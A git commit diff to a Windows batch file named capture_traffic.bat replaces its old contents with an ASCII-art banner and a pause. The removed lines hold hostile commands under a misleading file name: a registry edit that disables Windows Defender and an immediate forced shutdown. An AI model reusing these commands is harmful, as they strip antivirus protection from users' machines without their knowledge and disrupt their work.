d4071228a5747fab02f0198e666ca44e9137f6fe
qmze <6255499+qmze@users.noreply.github.com>
2024-04-27 09:00:24 +0100

    Update capture_traffic.bat

--- capture_traffic.bat
+++ capture_traffic.bat
@@ -1,11 +1,10 @@
 @echo off
 cls
-
-:: Open Command Prompt
-start cmd /k
-
-:: Disable Windows Defender via registry
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
-
-:: Shut down the computer
-shutdown /s /t 0
+echo.
+echo   ______ _____ ________ ____  
+echo  / ____//     \___   // __ \ 
+echo < <_|  |  Y Y  \/    /\  ___/ 
+echo   \__   |__|_|  /_____ \\___  >
+echo      |__|     \/      \/    \/ 
+echo.
+pause
